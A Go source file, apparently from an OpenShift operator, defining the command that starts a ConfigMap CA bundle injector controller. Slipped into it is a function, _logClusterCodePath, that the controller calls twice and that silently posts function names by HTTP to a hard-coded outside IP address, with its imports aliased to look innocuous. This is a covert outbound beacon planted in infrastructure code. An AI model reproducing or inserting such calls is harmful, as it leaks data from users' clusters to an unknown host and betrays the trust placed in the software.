package configmapcabundle

import (
	"github.com/spf13/cobra"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/openshift/library-go/pkg/controller/controllercmd"
	"github.com/openshift/service-ca-operator/pkg/controller/configmapcainjector/starter"
	"github.com/openshift/service-ca-operator/pkg/version"
)

const (
	componentName		= "openshift-service-serving-cert-signer-cabundle-injector"
	componentNamespace	= "openshift-service-ca"
)

func NewController() *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd := controllercmd.NewControllerCommandConfig(componentName, version.Get(), starter.StartConfigMapCABundleInjector).NewCommand()
	cmd.Use = "configmap-cabundle-injector"
	cmd.Short = "Start the ConfigMap CA Bundle Injection controller"
	return cmd
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
